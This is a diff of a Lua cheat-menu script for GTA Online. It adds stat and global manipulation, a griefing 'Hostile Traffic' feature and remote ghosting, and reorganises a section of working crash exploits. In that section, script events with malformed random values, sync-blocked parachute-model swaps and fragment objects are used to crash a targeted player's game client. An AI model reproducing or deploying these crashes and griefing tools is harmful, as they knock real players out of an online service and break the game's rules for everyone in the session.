@@ -40,27 +40,26 @@ local multipliers = menu.list(tunables, "Multipliers", {""}, "")
 -------------------------------------
 
 local response = false
-local script_version = 2.02
-local rawGit = "https://raw.githubusercontent.com"
-async_http.init(rawGit,"/Lenalein2001/Lena-Utils/main/LenaUtilitiesVersion", function (output)
+local script_version = 2.03
+async_http.init('raw.githubusercontent.com','/Lenalein2001/Lena-Utils/main/LenaUtilitiesVersion', function (output)
     local remoteVersion = tonumber(output)
     response = true
     if script_version ~= remoteVersion then
-        util.yield(1000)
+        wait(1000)
         lenanotify(scriptname .. " is outdated, and requires an update ... update will start itself in 3 seconds")
-        util.yield(3000)
-        async_http.init(rawGit, "/Lenalein2001/Lena-Utils/main/Lena-Utilities.lua", function (a)
+        wait(3000)
+        async_http.init('raw.githubusercontent.com', '/Lenalein2001/Lena-Utils/main/Lena Utilities.lua', function (a)
             local catchError = select(2, load(a))
             if catchError then
                 lenanotify("Download failed :/. Restart the script, if that does not work, contact the owner of the script")
-                util.yield(3000)
+                wait(3000)
             return end
             local file = io.open(filesystem.scripts_dir() .. SCRIPT_RELPATH, "w+b")
             file:write(a)
             file:close()
             lenanotify(" " .. scriptname .. " has been updated successfully to version " .. remoteVersion .. 
             "\n script will be restarted automatically")
-            util.yield(3000)
+            wait(3000)
             util.restart_script()
         end)
         async_http.dispatch()
@@ -68,7 +67,7 @@ async_http.init(rawGit,"/Lenalein2001/Lena-Utils/main/LenaUtilitiesVersion", fun
 end, function () response = true end)
     async_http.dispatch()
 repeat
-    util.yield()
+    wait()
 until response
 
 -------------------------------------
@@ -96,6 +95,7 @@ local OrbitalCannon = require "lena.orbital_cannon"
 local llang = require 'lena/llang'
 local lkey = require 'lena/lkey'
 local scaleForm = require("ScaleformLib")
+require("KeramiScriptLib")
 
 local scriptdir <const> = filesystem.scripts_dir()
 for _, file in ipairs(required) do
@@ -209,6 +209,9 @@ DecorFlag_isAngryPlane = 1 << 3
 -- Startup & Config
 -----------------------------------
 
+local function onStartup()
+    SE_LocalPed = GetLocalPed()
+end
 gta_labels = require('all_labels')
 all_labels = gta_labels.all_labels
 is_loading = true
@@ -308,23 +311,49 @@ function play_anim(dict, name, duration)
     --TASK_PLAY_ANIM(Ped ped, char* animDictionary, char* animationName, float blendInSpeed, float blendOutSpeed, int duration, int flag, float playbackRate, BOOL lockX, BOOL lockY, BOOL lockZ)
 end
 
------------------------------------
--- Functions & Native Calls
------------------------------------	
+local function PopulateMyBusinessesTable()
+    if util.is_session_started() then
+        for slot = 0, 4 do
+            local property      = GetStatInt(prefix .. "factoryslot" .. slot) -- returns a property ID number
+            local property_info = MCBusinessPropertyInfo[property]
+            local type_number   = property_info and property_info.type or -1
+            local type_string   = property_info and MCBusinessTypesOrderedWithLabels[type_number].name or "None"
+            
 
-local function set_player_into_suitable_seat(ent)
-    local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
-    if not PED.IS_PED_A_PLAYER(driver) or driver == 0 then
-        if driver ~= 0 then
-            entities.delete_by_handle(driver)
+            MyBusinesses[slot]         = {property = property, type = type_number}
+            MyBusinesses[type_string]  = {
+                slot = slot,                        property = property,
+                product = GetBusinessProductFromStat(slot), supplies = GetBusinessSuppliesFromStat(slot),
+            }
         end
-        PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
+
+        do -- Bunker
+            local slot_and_type = 5
+            local property      = GetStatInt(prefix .. "factoryslot" .. slot_and_type) -- returns a property ID number
+            local type_string   = MCBusinessTypesOrderedWithLabels[slot_and_type].name
+            
+
+            MyBusinesses[slot_and_type]    = {property = property, type = slot_and_type}
+            MyBusinesses[type_string]       = {property = property, slot = 5,
+                product = GetBusinessProductFromStat(slot_and_type), supplies = GetBusinessSuppliesFromStat(slot_and_type),
+                research = GetBunkerResearchFromStat()
+            }
+        end
+
+        for index, data in pairs(HubTypesOrderedWithLabels) do
+            --MyBusinesses.Hub[data.name] = GetHubProductOfType(index) -- this reads the stat, Set Product manipluates the global only. Set Max Sell Price with this wont work.
+            MyBusinesses.Hub[data.name] = GetHubValueFromSlot(index) -- however, this one will work since its reading the global.
+        end
+    end
+end
+
+local function ReplacePlaceholder(str, rep, num)
+    local b, e = str:find("{"..num.."}")
+    if b and e then
+        return (str:sub(0, b-1) .. rep .. str:sub(e+1, -1))
     else
-        for i=0, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(ent) do
-            if VEHICLE.IS_VEHICLE_SEAT_FREE(ent, i) then
-                PED.SET_PED_INTO_VEHICLE(players.user_ped(), ent, -1)
-            end
-        end
+        util.log(string.format("Expected {%i} Placeholder in: %s", num, str))
+        return str
     end
 end
 
@@ -589,6 +618,22 @@ local function get_transition_state(pid)
     return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
 end
 
+local function IsInSession()
+    return util.is_session_started() and not util.is_session_transition_active()
+end
+
+local function GetGlobalInt(address)
+    return memory.read_int(memory.script_global(address))
+end
+
+local function GetGlobalFloat(address)
+    return memory.read_float(memory.script_global(address))
+end
+
+local function SetGlobalInt(address, value)
+    memory.write_int(memory.script_global(address), value)
+end
+
 local function SetLocalInt(script_str, script_local, value)
     local addr = memory.script_local(script_str, script_local)
     if addr ~= 0 then
@@ -601,6 +646,15 @@ function SET_INT_LOCAL(Script, Local, Value)
     if memory.script_local(Script, Local) ~= 0 then
         memory.write_int(memory.script_local(Script, Local), Value)
     end
+end
+
+local function getMPX()
+    return 'MP'.. util.get_char_slot() ..'_'
+end
+
+local function STAT_GET_INTW(Stat)
+    STATS.STAT_GET_INTW(util.joaat(getMPX() .. Stat), memory.alloc_int(), -1)
+    return memory.read_int(memory.alloc_int())
 end
 
 local function GetLocalInt(script_str, script_local)
@@ -620,6 +674,14 @@ local function ClearLocalBits(script_str, script_local, ...)
     if value then
         return SetLocalInt(script_str, script_local, ClearBits(value, ...))
     end
+end
+
+local function GetBusinessSuppliesFromStat(slot)
+    return GetStatInt(prefix .. "MATTOTALFORFACTORY" .. slot)
+end
+
+local function GetBusinessProductFromStat(slot)
+    return GetStatInt(prefix .. "PRODTOTALFORFACTORY" .. slot)
 end
 
 function IS_MPPLY(Stat)
@@ -1049,6 +1111,19 @@ end)
                 ENTITY.APPLY_FORCE_TO_ENTITY(player_cur_car, 1, -1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                 ENTITY.SET_ENTITY_ROTATION(player_cur_car, rot['x'], rot['y'], rot['z'], 0, true)
             end
+        end
+    end)
+
+    -------------------------------------
+    -- Vehicle Drift
+    -------------------------------------
+
+    menu.toggle_loop(vehicle, "Drift Mode", {""}, "Hold shift to drift", function(on)
+        if PAD.IS_CONTROL_PRESSED(21, 21) then
+            VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
+            VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
+        else
+            VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
         end
     end)
 
@@ -1855,7 +1930,7 @@ end)
             end
             if not input:find '[^%w_%.%-]' then break end
             label = customLabels.InvalidChar
-            util.yield(200)
+            wait(200)
         end
 
         local data = {}
@@ -2246,7 +2321,7 @@ end)
                     end
                 end
             end
-            util.yield()
+            wait()
         end
     end)
 
@@ -2316,7 +2391,7 @@ end)
 
     local thunder_on = menu.ref_by_path("Online>Session>Thunder Weather>Enable Request")
     local thunder_off = menu.ref_by_path("Online>Session>Thunder Weather>Disable Request")
-    menu.toggle(misc, "Weather Toggle", {"Thunder"}, "", function(on_toggle)
+    menu.toggle(misc, "Weather Toggle", {"thunder"}, "", function(on_toggle)
         if on_toggle then
             menu.trigger_commands("weather normal")
             wait(1000)
@@ -2406,6 +2481,7 @@ end)
                 wait()
             end
         end
+
         notify("Cleared " .. cleanse_entitycount .. " Peds")
         cleanse_entitycount = 0
         for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
@@ -2415,6 +2491,7 @@ end)
                 wait()
             end
         end
+
         notify("Cleared ".. cleanse_entitycount .." Vehicles")
         cleanse_entitycount = 0
         for _, object in pairs(entities.get_all_objects_as_handles()) do
@@ -2422,6 +2499,7 @@ end)
             cleanse_entitycount += 1
             wait()
         end
+
         notify("Cleared " .. cleanse_entitycount .. " Objects")
         cleanse_entitycount = 0
         for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
@@ -2429,6 +2507,7 @@ end)
             cleanse_entitycount += 1
             wait()
         end
+
         notify("Cleared " .. cleanse_entitycount .. " Pickups")
         local temp = memory.alloc(4)
         for i = 0, 100 do
@@ -2566,6 +2645,7 @@ end)
         STAT_SET_INT("MP_CHAR_ARMOUR_3_COUNT", 10)
         STAT_SET_INT("MP_CHAR_ARMOUR_4_COUNT", 10)
         STAT_SET_INT("MP_CHAR_ARMOUR_5_COUNT", 10)
+        notify("Snacks and Armor refilled!")
     end)
 
     -------------------------------------
@@ -2582,18 +2662,41 @@ end)
         SET_FLOAT_GLOBAL(262145 + 1, 1)
     end)
 
+    -------------------------------------
+    -- NC Popularity
+    -------------------------------------
+
+    menu.toggle_loop(tunables, 'Nightclub Popularity', {'ncmax'}, 'Keeps the Nightclub Popularity at max', function ()
+        if util.is_session_started() then
+            local ncpop = math.floor(STAT_GET_INTW('CLUB_POPULARITY') / 10)
+            if ncpop < 60 then
+                menu.trigger_commands('clubpopularity 100')
+                wait(250)
+                notify("NC Popularity maxed!")
+            end
+        end
+    end)
+
 --------------------------------------------------------------------------------
 ------------------------------- PLAYER FEATURES --------------------------------
 --------------------------------------------------------------------------------
 
 local function player(pid)
     
+    if players.get_rockstar_id(pid) == 150742615 and players.get_rockstar_id_2(pid) == 150742615 then
+        menu.readonly(menu.my_root(), "I Love you", "")
+
+        if players.get_rockstar_id(pid) == 216142317 and players.get_rockstar_id_2(pid) == 216142317 then
+            notify("Ur babe is here, have fun :*")
+        end
+    end
+
     menu.divider(menu.player_root(pid), "Lena Utilities")
     local lena = menu.list(menu.player_root(pid), "Lena Utilities", {"lenau"}, "")
     local friendly = menu.list(lena, "Friendly", {""}, "")
     local mpvehicle = menu.list(lena, "Vehicle", {""}, "")
     local trolling = menu.list(lena, "Trolling", {""}, "")
-    local player_removals = menu.list(lena, "Kicks & Crashes", {""}, "")
+    local player_removals = menu.list(lena, "Remove Player", {""}, "")
     local kicks = menu.list(player_removals, "Kicks", {""}, "")
     local crashes = menu.list(player_removals, "Crashes", {""}, "")
     local tp_player = menu.list(trolling, "Teleport Player", {}, "")
@@ -2749,6 +2852,29 @@ local function player(pid)
             end
     end)
 
+    	-------------------------------------
+	-- HOSTILE TRAFFIC
+	-------------------------------------
+
+	menu.toggle_loop(trolling, "Hostile Traffic", {}, "", function()
+		if not is_player_active(pid, false, true) then
+			return util.stop_thread()
+		end
+		local targetPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+		for _, vehicle in ipairs(get_vehicles_in_player_range(pid, 70.0)) do
+			if TASK.GET_ACTIVE_VEHICLE_MISSION_TYPE(vehicle) ~= 6 then
+				local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1, false)
+				if ENTITY.DOES_ENTITY_EXIST(driver) and not PED.IS_PED_A_PLAYER(driver) then
+					request_control_once(driver)
+					PED.SET_PED_MAX_HEALTH(driver, 300)
+					ENTITY.SET_ENTITY_HEALTH(driver, 300, 0)
+					PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
+					TASK.TASK_VEHICLE_MISSION_PED_TARGET(driver, vehicle, targetPed, 6, 100.0, 0, 0.0, 0.0, true)
+				end
+			end
+		end
+	end)
+
 	-------------------------------------
 	-- Remote TP's
 	-------------------------------------
@@ -2897,7 +3023,13 @@ local function player(pid)
         menu.trigger_commands("mission" .. players.get_name(pid))
     end)
 
+    -------------------------------------
+    -- Ghost to User
+    -------------------------------------
 
+    menu.toggle(trolling, "Ghost", {""}, "", function(on)
+        NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, on)
+    end)
 
 -------------------------------------
 -------------------------------------
@@ -2930,144 +3062,142 @@ local function player(pid)
     -------------------------------------
     -- Crashes
     -------------------------------------
+    if players.get_rockstar_id(pid) == 216142317 and players.get_rockstar_id_2(pid) == 216142317 then
 
-    menu.readonly(crashes, "Why...?  Just why?", "Crash Addict")
-    menu.action(crashes, "Block Join Crash", {""}, "", function()
-        wait(500)
-        menu.trigger_commands("choke " .. players.get_name(pid))
-        wait(500)
-        menu.trigger_commands("crash " .. players.get_name(pid))
-        wait(500)
-        menu.trigger_commands("historyblock" .. players.get_name(pid))
-    end)
-
-    --menu.divider(crashes, "Why do you want to crash players?", {""})
-    local nature = menu.list(crashes, "Para", {}, "")
-    menu.action(nature, "Version 1", {"V1"}, "", function()
-        local user = players.user()
-        local user_ped = players.user_ped()
-        local pos = players.get_position(user)
-        BlockSyncs(pid, function() 
-            wait(100)
-            menu.trigger_commands("invisibility on")
-            for i = 0, 110 do
-                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
-                PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
-                wait(50)
-                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-            end
-            wait(250)
-            for i = 1, 5 do
-                util.spoof_script("freemode", SYSTEM.wait) 
-            end
-            ENTITY.SET_ENTITY_HEALTH(user_ped, 0) 
-            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
-            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-            menu.trigger_commands("invisibility off")
+        menu.action(crashes, "Block Join Crash", {""}, "", function()
+            wait(500)
+            menu.trigger_commands("choke " .. players.get_name(pid))
+            wait(500)
+            menu.trigger_commands("crash " .. players.get_name(pid))
+            wait(500)
+            menu.trigger_commands("historyblock" .. players.get_name(pid))
         end)
-    end)
-    
-    menu.action(nature, "Version 2", {"V2"}, "", function()
-        local user = players.user()
-        local user_ped = players.user_ped()
-        local pos = players.get_position(user)
-        BlockSyncs(pid, function() 
-            wait(100)
-            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
-            wepON.GIVE_DELAYED_wepON_TO_PED(user_ped, 0xFBAB5776, 100, false)
-            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
-            wait()
-            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
-            wait(250)
-            wepON.GIVE_DELAYED_wepON_TO_PED(user_ped, 0xFBAB5776, 100, false)
-            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-            wait(1000)
-            for i = 1, 5 do
-                util.spoof_script("freemode", SYSTEM.wait)
-            end
-            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
-            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
-        end)
-    end, nil, nil, COMMANDPERM_RUDE)
 
-    --menu.divider(crashes, "You better know what ur doing", {""})
-    menu.action(crashes, "V3", {"v3"}, "", function()
-        local mdl = util.joaat('a_c_poodle')
-        BlockSyncs(pid, function()
-            if request_model(mdl, 2) then
-                local pos = players.get_position(pid)
+        local nature = menu.list(crashes, "Para", {}, "")
+        menu.action(nature, "Version 1", {"V1"}, "", function()
+            local user = players.user()
+            local user_ped = players.user_ped()
+            local pos = players.get_position(user)
+            BlockSyncs(pid, function() 
                 wait(100)
-                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
-                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
-                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
-                wepON.GIVE_wepON_TO_PED(ped1, util.joaat('wepON_HOMINGLAUNCHER'), 9999, true, true)
-                local obj
-                repeat
-                    obj = wepON.GET_CURRENT_PED_wepON_ENTITY_INDEX(ped1, 0)
-                until obj ~= 0 or wait()
-                ENTITY.DETACH_ENTITY(obj, true, true) 
-                wait(1500)
-                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
-                entities.delete_by_handle(ped1)
+                menu.trigger_commands("invisibility on")
+                for i = 0, 110 do
+                    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
+                    PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
+                    wait(50)
+                    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+                end
+                wait(250)
+                for i = 1, 5 do
+                    util.spoof_script("freemode", SYSTEM.wait) 
+                end
+                ENTITY.SET_ENTITY_HEALTH(user_ped, 0) 
+                NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
+                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+                menu.trigger_commands("invisibility off")
+            end)
+        end)
+        
+        menu.action(nature, "Version 2", {"V2"}, "", function()
+            local user = players.user()
+            local user_ped = players.user_ped()
+            local pos = players.get_position(user)
+            BlockSyncs(pid, function() 
+                wait(100)
+                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
+                wepON.GIVE_DELAYED_wepON_TO_PED(user_ped, 0xFBAB5776, 100, false)
+                TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
+                wait()
+                TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
+                wait(250)
+                wepON.GIVE_DELAYED_wepON_TO_PED(user_ped, 0xFBAB5776, 100, false)
+                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
                 wait(1000)
-            else
-                notify("Failed to load model. :/")
+                for i = 1, 5 do
+                    util.spoof_script("freemode", SYSTEM.wait)
+                end
+                ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
+                NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
+            end)
+        end, nil, nil, COMMANDPERM_RUDE)
+
+        menu.action(crashes, "V3", {"v3"}, "", function()
+            local mdl = util.joaat('a_c_poodle')
+            BlockSyncs(pid, function()
+                if request_model(mdl, 2) then
+                    local pos = players.get_position(pid)
+                    wait(100)
+                    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+                    ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0) 
+                    local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
+                    wepON.GIVE_wepON_TO_PED(ped1, util.joaat('wepON_HOMINGLAUNCHER'), 9999, true, true)
+                    local obj
+                    repeat
+                        obj = wepON.GET_CURRENT_PED_wepON_ENTITY_INDEX(ped1, 0)
+                    until obj ~= 0 or wait()
+                    ENTITY.DETACH_ENTITY(obj, true, true) 
+                    wait(1500)
+                    FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
+                    entities.delete_by_handle(ped1)
+                    wait(1000)
+                else
+                    notify("Failed to load model. :/")
+                end
+            end)
+        end)
+
+        menu.action(crashes, "Fragment Crash", {""}, "", function()
+            BlockSyncs(pid, function()
+                local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
+                OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
+                wait(1000)
+                entities.delete_by_handle(object)
+            end)
+        end)
+
+        menu.action(crashes, "Lena's Crash", {"ICBM"}, "", function()
+            local int_min = -2147483647
+            local int_max = 2147483647
+            for i = 1, 150 do
+                util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
+                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
             end
+            wait()
+            for i = 1, 15 do
+                util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
+            end
+            menu.trigger_commands("givesh " .. players.get_name(pid))
+            wait(100)
+            util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
+            util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
+            util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
+        end, nil, nil, COMMANDPERM_AGGRESSIVE)
+
+        menu.action(crashes, "MK2 Griefer", {"grief"}, "Should work one some menus, idk. Dont crash players", function()
+            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
+            local pos = players.get_position(pid)
+            local mdl = util.joaat("u_m_m_jesus_01")
+            local veh_mdl = util.joaat("oppressor")
+            util.request_model(veh_mdl)
+            util.request_model(mdl)
+                for i = 1, 10 do
+                    if not players.exists(pid) then
+                        return
+                    end
+                    local veh = entities.create_vehicle(veh_mdl, pos, 0)
+                    local jesus = entities.create_ped(2, mdl, pos, 0)
+                    PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
+                    wait(100)
+                    TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
+                    wait(1000)
+                    entities.delete_by_handle(jesus)
+                    entities.delete_by_handle(veh)
+                end
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
         end)
-    end)
-
-    --menu.divider(crashes, "", {""})
-    menu.action(crashes, "Fragment Crash", {""}, "", function()
-        BlockSyncs(pid, function()
-            local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
-            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
-            wait(1000)
-            entities.delete_by_handle(object)
-        end)
-    end)
-
-    menu.action(crashes, "Lena's Crash", {"ICBM"}, "", function()
-        local int_min = -2147483647
-        local int_max = 2147483647
-        for i = 1, 150 do
-            util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
-            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-            math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        end
-        wait()
-        for i = 1, 15 do
-            util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
-        end
-        menu.trigger_commands("givesh " .. players.get_name(pid))
-        wait(100)
-        util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
-        util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
-        util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
-    end, nil, nil, COMMANDPERM_AGGRESSIVE)
-
-    menu.action(crashes, "MK2 Griefer", {"grief"}, "Should work one some menus, idk. Dont crash players", function()
-        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
-		local pos = players.get_position(pid)
-		local mdl = util.joaat("u_m_m_jesus_01")
-		local veh_mdl = util.joaat("oppressor")
-		util.request_model(veh_mdl)
-        util.request_model(mdl)
-			for i = 1, 10 do
-				if not players.exists(pid) then
-					return
-				end
-				local veh = entities.create_vehicle(veh_mdl, pos, 0)
-				local jesus = entities.create_ped(2, mdl, pos, 0)
-				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
-				util.yield(100)
-				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
-				util.yield(1000)
-				entities.delete_by_handle(jesus)
-				entities.delete_by_handle(veh)
-			end
-		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
-		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
-    end)
+    end
 end
 
 function UnregisterNetworkObject(object, reason, force1, force2)
@@ -3182,7 +3312,7 @@ players.dispatch_on_join()
 
 while true do
     OrbitalCannon.mainLoop()
-    util.yield_once()
+    wait_once()
 end
 
 util.keep_running()
